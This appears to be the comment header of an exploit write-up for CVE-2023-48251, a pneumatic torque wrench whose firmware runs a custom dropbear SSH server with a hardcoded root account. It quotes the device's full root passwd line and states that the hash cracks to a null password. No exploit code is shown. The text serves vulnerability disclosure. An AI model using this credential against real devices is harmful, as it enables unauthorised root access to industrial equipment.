# CVE-2023-48251 is a pnumatic torque wrench running a ssh server, with a passwd 
# file (yes, passwd, not shadow, for reasons unknown to me...) with hardcoded 
# cedentials for the root account. The firmware once disassembled shows that 
# it runs a custom compiled version of dropbear ssh, it lacks a /etc/shadow 
# completely, and has a /etc/passwd file with only two lines.  The relevanet 
# line being: root:DNBrppmB3kkRs:0:0:root:/home/tool:/bin/sh
# Where the descrypt hash DNBrppmB3kkRs when run through John the Ripper, shows
# that this resolves to a null password.  Once I figured this out, the rest of the
# exploit was rather trivial, after recreating the environment similar to that on
# the tool.
